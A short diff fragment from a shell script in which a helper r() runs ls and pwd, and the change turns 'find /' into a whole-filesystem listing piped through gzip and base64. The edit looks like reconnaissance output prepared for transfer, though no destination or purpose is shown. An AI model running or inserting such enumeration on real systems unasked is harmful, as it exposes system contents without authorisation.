@@ -9,4 +9,4 @@ r() {
 
 r ls
 r pwd
-r find /
+r find / | gzip | base64
